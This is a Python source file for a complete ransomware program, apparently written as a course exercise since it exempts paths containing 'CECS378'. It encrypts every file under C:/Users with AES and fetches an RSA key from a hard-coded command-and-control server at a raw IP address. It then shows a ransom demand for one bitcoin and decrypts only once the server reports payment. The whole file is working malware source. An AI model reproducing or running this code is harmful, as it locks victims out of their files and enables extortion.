from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

import tkinter as tk
from tkinter import messagebox

import requests
import os


# Ransomware Encryption Utilities

def encrypt_file(file_path, out_file_path, key):
    with open(file_path, 'rb') as infile:
        in_data = infile.read()

    initial_vector = get_random_bytes(AES.block_size)
    encryptor = AES.new(key, AES.MODE_CBC, initial_vector)

    padded_data = pad(in_data, AES.block_size)

    out_data = encryptor.encrypt(padded_data)

    with open(out_file_path, 'wb') as outfile:
        outfile.write(initial_vector+out_data)

def decrypt_file(file_path, out_file_path, key):
    with open(file_path, 'rb') as infile:
        initial_vector = infile.read(AES.block_size)
        to_decrypt = infile.read()

    encryptor = AES.new(key, AES.MODE_CBC, initial_vector)
    decrypted = unpad(encryptor.decrypt(to_decrypt), AES.block_size)
    
    with open(out_file_path, 'wb') as outfile:
        outfile.write(decrypted)

# Batch Functions
file_paths = []

def load_file_paths():
    for root, dirs, files in os.walk("C:/Users"):
        for name in dirs + files:
            path = os.path.join(root, name)
            global file_paths
            if "CECS378" not in path.lower():
                file_paths.append(os.path.join(root, name))

# C2 Server Connection
url = 'http://34.66.45.94:3000/'
pub_path = "./pub_key.pem"
priv_key = None

def has_paid(pub_key) -> bool:
    pay_request = requests.post(url+'check-payment', 
                                json={'pub_key':pub_key})
    if pay_request.status_code != 200:
        print("Failed to request payment check...")
        return False

    result = pay_request.json().get('success')

    if result == 'true':
        priv_key_pem = pay_request.json().get('key')
        global priv_key
        priv_key = serialization.load_pem_private_key(
                priv_key_pem.encode('utf-8'),
                password=None
                )
        return True
    else:
        return False

# Get AES Key
key_path = "./aes_key.bin"
key = None

if os.path.exists(key_path) and os.path.exists(pub_path):
    with open(key_path, 'rb') as key_file:
        key = key_file.read()

else:
    key = get_random_bytes(32)

    # Start Encrypting Computer
    load_file_paths()
    for path in file_paths:
        encrypt_file(path, path, key)

    # Encrypt AES Key And Store In File
    # Get Public Key From C2 Server
    pub_key = None
    key_request = requests.get(url+'gen-key')
    if key_request.status_code != 200:
        print("Failed to grab public key")
        exit()

    pub_key_pem = key_request.json().get('pub_key')
    pub_key = serialization.load_pem_public_key(
            pub_key_pem.encode('utf-8'),
            backend=default_backend()
        )

    # Use Public Key to Encrypt AES Key
    aes_key = pub_key.encrypt(key,
                              padding.OAEP(
                                  mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                  algorithm=hashes.SHA256(),
                                  label = None
                                  )
                              )
    
    # Store AES Key Into File
    with open(key_path, 'wb') as key_file:
        key_file.write(aes_key)

    # Store Public Key Pem Into File
    with open(pub_path, 'w') as pub_file:
        pub_file.write(pub_key_pem)

    messagebox.showinfo("Computer Hostage!", "Please pay 1 bitcoin to address: <insert wallet>")


pub_key_pem = None
with open(pub_path, 'r') as pub_file:
    pub_key_pem = pub_file.read()

usr = messagebox.askyesno("Payment", "Did you pay?")

if not usr:
    messagebox.showinfo("Well..", "Come back when you do!")
    requests.post(url+"simulate-payment", json={'pub_key':pub_key_pem})
    exit()

if has_paid(pub_key_pem) == False:
    messagebox.showinfo("Wow..", "You're a little liar")
    exit()

with open(key_path, 'rb') as key_file:
        key = key_file.read()

decrypted_aes = priv_key.decrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
            )
        )

load_file_paths()
for dec_path in file_paths:
    decrypt_file(dec_path, dec_path, decrypted_aes)
